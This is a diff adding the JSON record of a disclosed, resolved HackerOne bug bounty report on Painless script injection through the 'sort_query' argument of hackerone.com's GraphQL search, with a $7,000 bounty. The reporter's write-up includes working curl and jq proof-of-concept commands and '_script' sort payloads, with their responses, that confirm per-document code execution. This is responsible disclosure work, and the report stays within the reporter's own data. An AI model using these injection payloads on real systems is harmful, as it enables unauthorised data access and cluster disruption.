@@ -1,0 +1,139 @@
+{
+  "id": 3694007,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjk0MDA3",
+  "url": "https://hackerone.com/reports/3694007",
+  "title": "Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-04-24T19:35:17.915Z",
+  "submitted_at": "2026-04-24T19:35:18.760Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "brumbelow",
+    "url": "/brumbelow",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/rozlu1u0aa5bvlpf4d2gz9st2wt9/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-17T14:17:26.678Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-06-17T13:34:56.364Z",
+  "team_member_agreed_on_going_public_at": "2026-06-17T14:17:25.460Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\n- The `sort_query: String` argument on `Query.search` (`hackerone.com/graphql`) is passed to the downstream Elasticsearch cluster as the raw value of the `sort` parameter, without server-side schema validation, keyword allowlisting, or rejection of scripted sort directives.\n\n- I confirmed per-document Painless script execution by submitting two requests that differ only in the `script.source` field and observing that the script's return value determined document ordering. \n\n- The first request returned a constant sort key; the second read each document's internal `_seq_no` metadata field and returned it as the sort key. The result sets share zero overlapping documents in the first five positions, and the second request's ordering matches a known ascending-by-`_seq_no` baseline. This difference is only explainable by the Painless script compiling and executing per document against the `doc` context.\n\nAll testing was conducted against documents within my own authorization boundary (`NotificationsIndex`, scoped to my own notifications by a server-side user filter). The scripts I supplied did not read any user content, any foreign-tenant data, or any field beyond the `_seq_no` ES-internal metadata field.\n\n**Description:**\n- **URL:** `https://hackerone.com/graphql`\n- **Method:** `POST`\n- **GraphQL field:** `Query.search`\n- **Argument:** `sort_query: String`\n- **Index tested:** `NotificationsIndex`\n\nThe following additional surfaces expose the same `sort_query: String` argument and are likely to share the vulnerability, but were not tested:\n\n- `Query.search` with other `IndexEnum` values (`DuplicateDetectorReportsIndex`, `OpportunitiesIndex`, `CompleteHacktivityReportIndex`, `StoredQueriesIndex`)\n- `Organization.findings_search.sort_query: String`\n\n## Steps To Reproduce\n\n### Environment assumptions\n\nAll PoC commands assume the same browser session as the production frontend:\n\n```bash\n# /tmp/h1.headers contents:\n#   accept: */*\n#   content-type: application/json\n#   origin: https://hackerone.com\n#   referer: https://hackerone.com/notifications\n#   user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36\n#   x-csrf-token: <session CSRF token>\n#   x-product-area: notifications\n#   x-product-feature: overview\n#\n# $COOKIE contains the full authenticated cookie jar including __Host-session and cf_clearance.\n```\n\n### Step 1 — Confirm session identity\n\n```bash\ncurl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b \"$COOKIE\" \\\n  --data-raw '{\"query\":\"{me{_id username}}\"}' | jq\n```\n\n**Response:**\n\n```json\n{\"data\":{\"me\":{\"_id\":\"████████\",\"username\":\"brumbelow\"}}}\n```\n\nReporter-level account with no elevated privileges.\n\n### Step 2 — Confirm `sort_query` accepts raw Elasticsearch JSON\n\nBefore testing any scripting payload, I established that `sort_query` accepts arbitrary JSON sort specifications and that the sort takes effect on results.\n\n```bash\n# Field-based JSON sort — confirms JSON is parsed and sort is applied\ncurl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b \"$COOKIE\" \\\n  --data-raw '{\"query\":\"query{search(index:NotificationsIndex,query_string:\\\"*\\\",sort_query:\\\"[{\\\\\\\"id\\\\\\\":\\\\\\\"asc\\\\\\\"}]\\\",size:5){nodes{... on NotificationDocument{id}}}}\"}' | jq\n```\n\n**Response (abridged):**\n\n```json\n{\n  \"data\": {\n    \"search\": {\n      \"nodes\": [\n        {\"id\": \"Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MDQ1NDc2MzM=\"},\n        {\"id\": \"Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MDg0NDY1MDQ=\"},\n        {\"id\": \"Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MTY3MzcwOTQ=\"},\n        {\"id\": \"Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MTczMDAwNDI=\"},\n        {\"id\": \"Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MTc0NjczMDM=\"}\n      ]\n    }\n  }\n}\n```\n\nDecoded internal `_id` values: `404547633`, `408446504`, `416737094`, `417300042`, `417467303` — monotonically ascending, confirming JSON sort directives are parsed and applied by Elasticsearch.\n\nI additionally confirmed object-shaped sort specifications (with nested `order`, `mode`, `missing` keys) are accepted:\n\n```bash\nfor sq in \\\n  '[{\"user_id\":{\"order\":\"desc\"}}]' \\\n  '[{\"user_id\":{\"order\":\"desc\",\"missing\":\"_last\"}}]' \\\n  '[{\"created_at\":{\"order\":\"desc\",\"mode\":\"max\"}}]'; do\n  q=$(jq -n --arg sq \"$sq\" '{query:\"query($sq:String){search(index:NotificationsIndex,query_string:\\\"*\\\",sort_query:$sq,size:1){total_count}}\", variables:{sq:$sq}}')\n  printf '%-55s ' \"$(echo \"$sq\" | head -c 53)\"\n  curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b \"$COOKIE\" --data-raw \"$q\" \\\n    | jq -c '{tc:.data.search.total_count, err:(.errors[0].message // null)}'\n  sleep 1.2\ndone\n```\n\n**Response:**\n\n```\n[{\"user_id\":{\"order\":\"desc\"}}]                        {\"tc\":716,\"err\":null}\n[{\"user_id\":{\"order\":\"desc\",\"missing\":\"_last\"}}]      {\"tc\":716,\"err\":null}\n[{\"created_at\":{\"order\":\"desc\",\"mode\":\"max\"}}]        {\"tc\":716,\"err\":null}\n```\n\nNote: `total_count: 716` is the caller's personal notification count, confirming the result set is filtered to my own notifications by a server-side user filter applied prior to sort. All subsequent script testing occurred within this already-filtered result set.\n\n### Step 3 — Differential Painless compilation evidence\n\nCompile-failure vs. compile-success probes isolate the behavior of `_script` clauses when the source is malformed vs. valid Painless. Same GraphQL query shape in all cases; only `sort_query.script.source` changes.\n\n```bash\nq='query($sq:String){search(index:NotificationsIndex,query_string:\"*\",sort_query:$sq,size:1){total_count}}'\n\nfor sq in \\\n  '[{\"_script\":{\"type\":\"number\",\"order\":\"asc\"}}]' \\\n  '[{\"_script\":{\"type\":\"number\",\"script\":{\"source\":\"\",\"lang\":\"painless\"},\"order\":\"asc\"}}]' \\\n  '[{\"_script\":{\"type\":\"number\",\"script\":{\"source\":\"\\\"unterminated\",\"lang\":\"painless\"},\"order\":\"asc\"}}]' \\\n  '[{\"_script\":{\"type\":\"number\",\"script\":{\"source\":\"1\",\"lang\":\"painless\"},\"order\":\"asc\"}}]' \\\n  '[{\"_script\":{\"type\":\"number\",\"script\":{\"source\":\"1+1\",\"lang\":\"painless\"},\"order\":\"asc\"}}]'; do\n  body=$(jq -n --arg q \"$q\" --arg sq \"$sq\" '{query:$q,variables:{sq:$sq}}')\n  printf '%-95s ' \"$(echo \"$sq\" | head -c 93)\"\n  curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b \"$COOKIE\" --data-raw \"$body\" \\\n    | jq -c '{tc:.data.search.total_count, err:(.errors[0].message // null)[0:40]}'\n  sleep 1.5\ndone\n```\n\n**Observed results:**\n\n| `script.source` | Result | Painless compile outcome |\n|---|---|---|\n| (no `script` key at all) | HTTP 500 / `STANDARD_ERROR` | n/a — malformed `_script` shape |\n| `\"\"` (empty) | HTTP 500 / `STANDARD_ERROR` | compile failure |\n| `\"unterminated` (invalid Painless) | HTTP 500 / `STANDARD_ERROR` | compile failure |\n| `\"1\"` | HTTP 200, `total_count: 716` | compile success |\n| `\"1+1\"` | HTTP 200, `total_count: 716` | compile success |\n\nThe 200/500 split tracks precisely with whether the source is valid Painless. Middleware performing only JSON-schema validation on `sort_query` could not differentiate these cases — all five payloads are structurally well-formed JSON with the same top-level keys. The only layer that distinguishes \"empty string\" and \"unterminated string literal\" from `\"1\"` is a Painless compiler reached with the attacker-controlled source.\n\n### Step 4 — Differential per-document execution evidence\n\nTwo requests differing only in the value of `script.source`. Both select `edges { cursor node { id } }` to capture ordering. If the script in Request B executes per document, reading `doc[\"_seq_no\"].value`, the ordering will differ from the constant-return Request A.\n\n```bash\nq='query($sq:String){search(index:NotificationsIndex,query_string:\"*\",sort_query:$sq,size:5){edges{cursor node{__typename ... on NotificationDocument{id}}}}}'\n\n# Request A — baseline, constant return\nsq_A='[{\"_script\":{\"type\":\"number\",\"script\":{\"source\":\"1\",\"lang\":\"painless\"},\"order\":\"asc\"}}]'\n\n# Request B — per-document field read\nsq_B='[{\"_script\":{\"type\":\"number\",\"script\":{\"source\":\"doc[\\\"_seq_no\\\"].value\",\"lang\":\"painless\"},\"order\":\"asc\"}}]'\n\necho \"=== Request A (constant return) ===\"\nbody=$(jq -n --arg q \"$q\" --arg sq \"$sq_A\" '{query:$q,variables:{sq:$sq}}')\ncurl -sk -D /tmp/probeA_headers 'https://hackerone.com/graphql' \\\n  -H @/tmp/h1.headers -b \"$COOKIE\" --data-raw \"$body\" | tee /tmp/probeA_body.json \\\n  | jq -c '.data.search.edges | map(.node.id)'\ngrep -i '^x-request-id' /tmp/probeA_headers\n\nsleep 2\n\necho \"=== Request B (per-doc field read) ===\"\nbody=$(jq -n --arg q \"$q\" --arg sq \"$sq_B\" '{query:$q,variables:{sq:$sq}}')\ncurl -sk -D /tmp/probeB_headers 'https://hackerone.com/graphql' \\\n  -H @/tmp/h1.headers -b \"$COOKIE\" --data-raw \"$body\" | tee /tmp/probeB_body.json \\\n  | jq -c '.data.search.edges | map(.node.id)'\ngrep -i '^x-request-id' /tmp/probeB_headers\n```\n\n**Request A response (`source: \"1\"`):**\n\n```\nx-request-id: 308106dc-dc26-479f-8bab-eba02d6591c1\n```\n\nFirst 5 document `id` values (decoded from base64 Relay global IDs):\n\n| Position | Base64 `id` | Decoded `_id` |\n|---|---|---|\n| 1 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80NTExOTAzOTM=` | `451190393` |\n| 2 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MzM1NzE4MDI=` | `433571802` |\n| 3 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80NDQ2NTE1ODI=` | `444651582` |\n| 4 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80NDQ3NzMxMjE=` | `444773121` |\n| 5 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80NDUwNjcxMTg=` | `445067118` |\n\n**Request B response (`source: \"doc[\\\"_seq_no\\\"].value\"`):**\n\n```\nx-request-id: c2daf19b-11e7-4f98-b608-44c42f52374a\n```\n\nFirst 5 document `id` values:\n\n| Position | Base64 `id` | Decoded `_id` |\n|---|---|---|\n| 1 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MDQ1NDc2MzM=` | `404547633` |\n| 2 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MDg0NDY1MDQ=` | `408446504` |\n| 3 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MTY3MzcwOTQ=` | `416737094` |\n| 4 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MTczMDAwNDI=` | `417300042` |\n| 5 | `Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC80MTc0NjczMDM=` | `417467303` |\n\n### Analysis\n\nThe two result sets share zero overlapping documents in the first five positions. Request B's ordering is strictly monotonically ascending by `_id`, and matches exactly the ordering obtained in Step 2 via the known-good `sort_query: '[{\"id\":\"asc\"}]'` (same first five IDs in the same order).\n\nIn Elasticsearch, `_seq_no` is a per-document sequence number assigned at indexing time and increases monotonically with insertion order. Sorting the caller's earliest-indexed notifications ascending by `_seq_no` therefore produces the same order as ascending by their internal `_id`.\n\nFor Request B's ordering to arise, the Painless script must have:\n\n1. Been compiled (consistent with the Step 3 compile-success result for valid sources)\n2. Been invoked once per document in the result set during the Elasticsearch sort phase\n3. Successfully read each document's `_seq_no` value via the `doc` context\n4. Returned that value as the sort key for its document\n\nIf the `_script` sort clause were being silently dropped upstream of Elasticsearch, or if Painless were compiling the source but discarding the output, Request B would have produced the same ordering as Request A. It did not — the orderings have no overlap.\n\nThis is direct evidence of per-document Painless script execution on the HackerOne production Elasticsearch cluster, triggered by a single authenticated GraphQL request from a reporter-level account.\n\n## Scope of testing\n\nI deliberately restricted testing to the minimum evidence required to establish execution:\n\n- Scripts submitted were `\"1\"`, `\"1+1\"`, `\"3+4\"`, `\"doc[\\\"_seq_no\\\"].value\"`, and intentionally-malformed variants. No field reads other than `_seq_no`, no method calls beyond `.value`, no stdlib usage, no parameters, no loops, no I/O.\n- `_seq_no` is an ES-internal metadata field present on every document. It is not user data, program data, or tenant data.\n- All probes ran against my own authenticated session's result set in `NotificationsIndex` (716 documents, all mine by server-side user filter).\n- I did not test sandbox boundaries (filesystem, environment, network, reflection).\n- I did not read any user data belonging to any other account.\n- I did not test cross-tenant access or document-authorization bypass.\n- I did not test other indices (`DuplicateDetectorReportsIndex`, `OpportunitiesIndex`, `CompleteHacktivityReportIndex`, `StoredQueriesIndex`) or other `sort_query`-exposing resolvers (`Organization.findings_search`).\n- I ceased all probing against `hackerone.com/graphql` immediately upon confirming per-document execution in Step 4.\n\n### Optional: Supporting Material/References (Screenshots)\n\nShowing script execution with above example:\n████████\n\n### Suggested remediation:\n- Remove the `sort_query: String` argument from `Query.search`. The typed `sort: SortInput` argument already serves the frontend's documented use cases. If richer sort expressions are required, expose a structured, schema-validated GraphQL input type rather than a free-form string.\n- Apply the same treatment to `Organization.findings_search.sort_query: String` and any other resolver that exposes a free-form `sort_query` argument.\n\n## Impact\n\nDescribe impact here.\nPainless execution inside the ES JVM process grants code execution on the infrastructure that indexes HackerOne's platform data. The types reachable through `Query.search` (via the `DocumentUnion` schema union) include:\n\n- `ReportDocument`, `FindingDocument`, `HacktivityDocument` — report content\n- `NotificationDocument` — notification content\n- `OpportunityDocument` — program metadata\n- `StructuredScopeDocument` — program scope definitions\n- `AssetDocument` — asset inventory\n- `OrganizationMemberDocument`, `OrganizationMemberGroupDocument` — organization membership\n- `AnalyticsGatewayHttpStreamDocument` — captured HTTP traffic metadata\n- `StoredQueryDocument` — saved queries\n\nConfidentiality impact is the most immediate concern even if the Painless sandbox blocks filesystem and network access: `_script` sort executes *within* the Elasticsearch query phase, before any GraphQL resolver-layer authorization filter. A script reading `doc['<field>'].value` sees fields on documents that are about to be scored or sorted — which includes documents the caller is not authorized to read at the resolver layer, if an index is not partitioned per-tenant at the ES level.\n\nI have not verified whether cross-tenant document access is possible, and I will not. That investigation should be performed by HackerOne's internal team.\n\nIn addition, Painless sort scripts are user-controlled code executed per document in the result set; adversarial scripts with deep loops, large allocations, or expensive computations can degrade the shared Elasticsearch cluster.",
+  "bounty_amount": "7000.0",
+  "formatted_bounty": "$7,000",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 16,
+  "voters": [
+    "ejc",
+    "buraaqsec",
+    "coder_mohammed",
+    "n1m0",
+    "ganeshbagaria",
+    "candysec",
+    "dpaysm",
+    "2026",
+    "brumbelow",
+    "sottam",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.8,
+    "author_type": "Team",
+    "cvss_4_point_0_metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "attack_requirements": "none",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "vulnerable_confidentiality": "high",
+      "vulnerable_integrity": "none",
+      "vulnerable_availability": "high",
+      "subsequent_confidentiality": "none",
+      "subsequent_integrity": "none",
+      "subsequent_availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
